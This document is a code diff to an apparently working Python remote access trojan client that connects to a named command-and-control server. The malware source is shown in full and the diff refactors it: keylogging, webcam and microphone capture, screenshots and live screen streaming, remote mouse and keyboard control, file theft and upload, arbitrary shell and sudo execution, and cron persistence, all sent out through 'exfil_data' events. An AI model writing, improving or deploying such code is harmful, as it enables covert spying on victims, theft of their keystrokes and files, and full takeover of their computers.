@@ -1,10 +1,21 @@
 #!/usr/bin/env python3
+
+# Standard Library Imports
 import platform
 import subprocess
 import json
 import time
 import os
 import threading
+import sys
+import getpass
+import socket
+import shutil
+import uuid
+import datetime
+import pytz
+
+# Third-Party Imports
 import psutil
 import netifaces
 from socketio import Client
@@ -17,22 +28,17 @@ from pynput.keyboard import Listener as KeyboardListener, Key, Controller as Key
 from pynput.mouse import Controller as MouseController, Listener as MouseListener, Button
 import base64
 import requests
-import platform
+
+# Platform-Specific Imports
 if platform.system() == "Windows":
     import winreg
 else:
     print("Windows persistence not supported in this environment. Please run on a Windows machine.")
-import getpass
-import socket
-import sys
-import shutil
-import uuid
-import datetime
-import pytz
 
-# Server settings
+# Server Settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"
 
+# --- Information Gathering Functions ---
 def get_system_info():
     """Gather detailed system information."""
     info = {
@@ -79,13 +85,11 @@ def get_hardware_info():
             print(f"[!] Error getting disk info for {partition.mountpoint}: {e}")
 
     battery = psutil.sensors_battery()
-    battery_info = None
-    if battery:
-        battery_info = {
-            "percent": battery.percent,
-            "power_plugged": battery.power_plugged,
-            "secsleft": battery.secsleft if battery.secsleft != psutil.POWER_TIME_UNLIMITED else "unlimited"
-        }
+    battery_info = {
+        "percent": battery.percent,
+        "power_plugged": battery.power_plugged,
+        "secsleft": battery.secsleft if battery and battery.secsleft != psutil.POWER_TIME_UNLIMITED else "unlimited"
+    } if battery else None
 
     return {
         "cpu": {
@@ -127,7 +131,6 @@ def get_network_info():
                 mac_addresses[iface] = mac
         network_info[iface] = iface_info
 
-    # Get public IP and location
     try:
         public_ip = requests.get("https://api.ipify.org").text
         location_data = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
@@ -145,9 +148,8 @@ def get_network_info():
         print(f"[!] Error getting public IP/location: {e}")
         location = {"public_ip": "Unknown", "city": "Unknown", "country": "Unknown"}
 
-    # Get gateway and DNS
     try:
-        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0] if netifaces.gateways()['default'].get(netifaces.AF_INET) else "Unknown"
+        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0] if netifaces.gateways().get(netifaces.AF_INET) else "Unknown"
     except Exception as e:
         gateway = "Unknown"
         print(f"[!] Error getting gateway: {e}")
@@ -381,6 +383,7 @@ def can_run_sudo():
         print(f"[!] Error checking sudo: {e}")
         return False
 
+# --- Monitoring and Capture Functions ---
 def monitor_network(sio):
     """Monitor network traffic and speed."""
     last_bytes_sent = psutil.net_io_counters().bytes_sent
@@ -407,7 +410,7 @@ def monitor_network(sio):
                 "sent_speed_mbps": round(sent_speed, 2),
                 "recv_speed_mbps": round(recv_speed, 2)
             }
-            sio.emit('exfil_data', json.dumps(network_data))
+            sio.emit('exfil_data', json.dumps(network_data), namespace='/client')
             print(f"[*] Sent network data: {network_data}")
 
             last_bytes_sent = bytes_sent
@@ -431,7 +434,7 @@ def monitor_system(sio):
                 "cpu_usage_percent": round(cpu_usage, 2),
                 "memory_usage_mb": round(memory_usage_mb, 2)
             }
-            sio.emit('exfil_data', json.dumps(system_data))
+            sio.emit('exfil_data', json.dumps(system_data), namespace='/client')
             print(f"[*] Sent system data: {system_data}")
         except Exception as e:
             print(f"[!] Error monitoring system: {e}")
@@ -442,7 +445,7 @@ def capture_webcam(sio):
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
             print("[!] Webcam not accessible")
-            sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam not accessible"}))
+            sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam not accessible"}), namespace='/client')
             return
         ret, frame = cap.read()
         cap.release()
@@ -453,13 +456,13 @@ def capture_webcam(sio):
                 "type": "webcam_data",
                 "client_id": sio.sid,
                 "image": img_base64
-            }))
+            }), namespace='/client')
             print("[*] Sent webcam data")
         else:
             print("[!] Failed to capture webcam frame")
     except Exception as e:
         print(f"[!] Error capturing webcam: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": str(e)}))
+        sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": str(e)}), namespace='/client')
 
 def record_mic(sio, duration=5):
     """Record audio from mic for a specified duration."""
@@ -474,7 +477,7 @@ def record_mic(sio, duration=5):
                 break
         if not mic_available:
             print("[!] No microphone detected")
-            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "No microphone detected"}))
+            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "No microphone detected"}), namespace='/client')
             p.terminate()
             return
 
@@ -511,15 +514,15 @@ def record_mic(sio, duration=5):
                     "type": "mic_data",
                     "client_id": sio.sid,
                     "audio": audio_base64
-                }))
+                }), namespace='/client')
                 print("[*] Sent mic data")
             os.remove(mic_file)
         else:
             print(f"[!] Mic file {mic_file} not found after writing")
-            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": f"Mic file {mic_file} not found"}))
+            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": f"Mic file {mic_file} not found"}), namespace='/client')
     except Exception as e:
         print(f"[!] Error recording mic: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": str(e)}))
+        sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": str(e)}), namespace='/client')
 
 def take_screenshot(sio):
     """Capture a screenshot."""
@@ -532,12 +535,12 @@ def take_screenshot(sio):
                 "type": "screenshot_data",
                 "client_id": sio.sid,
                 "image": img_base64
-            }))
+            }), namespace='/client')
             print("[*] Sent screenshot")
         os.remove("screenshot.png")
     except Exception as e:
         print(f"[!] Error taking screenshot: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": str(e)}))
+        sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": str(e)}), namespace='/client')
 
 def stream_screen(sio, stop_event):
     """Stream the victim's screen at 5 FPS."""
@@ -552,21 +555,25 @@ def stream_screen(sio, stop_event):
                     "type": "screen_stream",
                     "client_id": sio.sid,
                     "image": img_base64
-                }))
+                }), namespace='/client')
             os.remove("screen_stream.jpg")
             time.sleep(0.2)  # 5 FPS
     except Exception as e:
         print(f"[!] Error streaming screen: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "screen_stream_error", "message": str(e)}))
+        sio.emit('exfil_data', json.dumps({"type": "screen_stream_error", "message": str(e)}), namespace='/client')
 
+# --- Input Handling Functions ---
 def on_mouse_move(x, y):
+    """Log mouse movement (for debugging)."""
     print(f"[*] Mouse moved to ({x}, {y})")
 
 def on_mouse_click(x, y, button, pressed):
+    """Log mouse clicks (for debugging)."""
     if pressed:
         print(f"[*] Mouse clicked at ({x}, {y}) with {button}")
 
 def on_keyboard_press(key):
+    """Log keyboard presses to keylog.txt."""
     try:
         with open("keylog.txt", "a") as f:
             f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
@@ -575,7 +582,7 @@ def on_keyboard_press(key):
             f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
 
 def start_keylogger(sio):
-    """Start keylogger and send logs periodically using background task."""
+    """Start keylogger and send logs periodically."""
     def send_keylog():
         while True:
             time.sleep(10)
@@ -588,11 +595,11 @@ def start_keylogger(sio):
                             "type": "keylog_data",
                             "client_id": sio.sid,
                             "logs": logs
-                        }))
+                        }), namespace='/client')
                         print("[*] Sent keylog data")
             except Exception as e:
                 print(f"[!] Error sending keylog: {e}")
-    
+
     with KeyboardListener(on_press=on_keyboard_press) as listener:
         sio.start_background_task(send_keylog)
         listener.join()
@@ -606,7 +613,7 @@ def clear_keylogs(sio):
             "type": "keylog_data",
             "client_id": sio.sid,
             "logs": ""
-        }))
+        }), namespace='/client')
         print("[*] Cleared keylogs")
     except Exception as e:
         print(f"[!] Error clearing keylogs: {e}")
@@ -629,13 +636,13 @@ def setup_persistence(sio):
                 new_crons = existing_crons + cron_cmd + "\n"
                 subprocess.run("crontab", input=new_crons, text=True)
             output = "Persistence set up via cronjob"
-        
+
         sio.emit('exfil_data', json.dumps({
             "type": "command_output",
             "command": "setup_persistence",
             "output": output,
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
         print(f"[*] {output}")
     except Exception as e:
         error_msg = f"Error setting up persistence: {e}"
@@ -644,9 +651,10 @@ def setup_persistence(sio):
             "command": "setup_persistence",
             "output": error_msg,
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
         print(f"[!] {error_msg}")
 
+# --- Command Execution Functions ---
 def execute_command(command, sio):
     """Execute a system command."""
     try:
@@ -664,9 +672,8 @@ def execute_command(command, sio):
         elif command.strip().lower().startswith("sudo "):
             if not can_run_sudo():
                 return "Error: sudo is blocked in this environment (no new privileges flag). Use non-root commands."
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
-                return result.stdout + result.stderr
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
+            return result.stdout + result.stderr
         elif command.strip().lower() == "help":
             commands = [
                 "webcam - Capture webcam image",
@@ -702,14 +709,14 @@ def handle_mouse_control(command, sio):
                 "command": command,
                 "output": f"Mouse moved to ({x}, {y})",
                 "current_dir": os.getcwd()
-            }))
+            }), namespace='/client')
         except ValueError:
             sio.emit('exfil_data', json.dumps({
                 "type": "command_output",
                 "command": command,
                 "output": "Invalid coordinates",
                 "current_dir": os.getcwd()
-            }))
+            }), namespace='/client')
     elif len(parts) >= 2 and parts[0].lower() == "click":
         button = parts[1].lower()
         if button in ["left", "right"]:
@@ -719,14 +726,14 @@ def handle_mouse_control(command, sio):
                 "command": command,
                 "output": f"Clicked {button} button",
                 "current_dir": os.getcwd()
-            }))
+            }), namespace='/client')
         else:
             sio.emit('exfil_data', json.dumps({
                 "type": "command_output",
                 "command": command,
                 "output": "Invalid button (use left or right)",
                 "current_dir": os.getcwd()
-            }))
+            }), namespace='/client')
 
 def handle_remote_input(data, sio):
     """Handle remote mouse and keyboard inputs."""
@@ -774,7 +781,7 @@ def handle_remote_input(data, sio):
             "command": "remote_input",
             "output": f"Error handling input: {e}",
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
 
 def handle_file_download(command, sio):
     """Handle file download from victim."""
@@ -788,7 +795,7 @@ def handle_file_download(command, sio):
                     "client_id": sio.sid,
                     "filename": os.path.basename(path),
                     "data": file_data
-                }))
+                }), namespace='/client')
                 print(f"[*] Sent file {path}")
         else:
             sio.emit('exfil_data', json.dumps({
@@ -796,14 +803,14 @@ def handle_file_download(command, sio):
                 "command": command,
                 "output": f"File {path} not found",
                 "current_dir": os.getcwd()
-            }))
+            }), namespace='/client')
     except Exception as e:
         sio.emit('exfil_data', json.dumps({
             "type": "command_output",
             "command": command,
             "output": f"Error downloading file: {e}",
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
 
 def handle_file_upload(filename, data, sio):
     """Handle file upload to victim."""
@@ -816,7 +823,7 @@ def handle_file_upload(filename, data, sio):
             "command": f"upload {filename}",
             "output": f"File {filename} uploaded",
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
         print(f"[*] Received and saved {filename}")
     except Exception as e:
         sio.emit('exfil_data', json.dumps({
@@ -824,15 +831,18 @@ def handle_file_upload(filename, data, sio):
             "command": f"upload {filename}",
             "output": f"Error uploading file: {e}",
             "current_dir": os.getcwd()
-        }))
+        }), namespace='/client')
 
+# --- Main Function ---
 def main():
+    """Main function to initialize and run the RAT client."""
     sio = Client()
     screen_stream_stop_event = threading.Event()
+
     try:
-        @sio.event
+        @sio.event(namespace='/client')
         def connect():
-            print(f"[*] Connected to RAT server with SID: {sio.sid}")
+            print(f"[*] Connected to RAT server with SID: {sio.sid} on /client namespace")
             system_info = get_system_info()
             hardware_info = get_hardware_info()
             network_info = get_network_info()
@@ -853,23 +863,23 @@ def main():
                 "security": security_info,
                 "type": "system_info"
             }
-            sio.emit('exfil_data', json.dumps(exfil_data))
+            sio.emit('exfil_data', json.dumps(exfil_data), namespace='/client')
             print("[*] Exfiltrated data sent to RAT server")
 
             sio.start_background_task(monitor_network, sio)
             sio.start_background_task(monitor_system, sio)
             sio.start_background_task(start_keylogger, sio)
 
-        @sio.event
+        @sio.event(namespace='/client')
         def disconnect():
-            print(f"[*] Disconnected from RAT server with SID: {sio.sid}")
+            print(f"[*] Disconnected from RAT server with SID: {sio.sid} from /client namespace")
             screen_stream_stop_event.set()
 
-        @sio.event
+        @sio.event(namespace='/client')
         def connect_error(data):
-            print(f"[!] Connection failed: {data}")
+            print(f"[!] Connection failed: {data} - {str(sio.get_last_exception())}")
 
-        @sio.event
+        @sio.event(namespace='/client')
         def command(data):
             print(f"[*] Received command: {data}")
             if data.strip().lower() == "exit":
@@ -895,7 +905,7 @@ def main():
                     "command": "start_stream",
                     "output": "Screen streaming started",
                     "current_dir": os.getcwd()
-                }))
+                }), namespace='/client')
             elif data.strip().lower() == "stop_stream":
                 screen_stream_stop_event.set()
                 sio.emit('exfil_data', json.dumps({
@@ -903,7 +913,7 @@ def main():
                     "command": "stop_stream",
                     "output": "Screen streaming stopped",
                     "current_dir": os.getcwd()
-                }))
+                }), namespace='/client')
             elif data.strip().lower().startswith("move ") or data.strip().lower().startswith("click "):
                 handle_mouse_control(data, sio)
             elif data.strip().lower().startswith("download "):
@@ -915,13 +925,13 @@ def main():
                     "command": data,
                     "output": output,
                     "current_dir": os.getcwd()
-                }))
+                }), namespace='/client')
 
-        @sio.event
+        @sio.event(namespace='/client')
         def remote_input(data):
             handle_remote_input(data, sio)
 
-        @sio.event
+        @sio.event(namespace='/client')
         def upload_file(data):
             print(f"[*] Received upload command with data: {data}")
             handle_file_upload(data.get("filename"), data.get("data"), sio)
@@ -929,7 +939,7 @@ def main():
         while True:
             try:
                 print(f"[*] Attempting to connect to {SERVER_URL}")
-                sio.connect(SERVER_URL, transports=['websocket'], wait_timeout=10)
+                sio.connect(SERVER_URL, wait_timeout=10, verify=False, namespaces=['/client'])
                 sio.wait()
                 break
             except Exception as e:
